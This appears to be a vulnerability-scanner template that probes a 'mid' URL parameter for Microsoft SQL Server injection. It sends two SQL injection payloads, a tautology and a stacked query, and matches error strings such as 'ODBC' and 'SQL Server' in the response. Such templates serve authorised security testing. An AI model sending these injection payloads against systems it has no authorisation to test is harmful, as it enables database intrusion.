id: sqli3-mssql-04
name: 'SQLi mssql prefix #3 in mid'
severity: high
type: active
tags:
  - sqli
  - injection
  - mssql
description: 'Triggers mssql error via mid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      mid:
        - '1'' OR ''1''=''1'' /*'
        - '1''; SELECT 1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
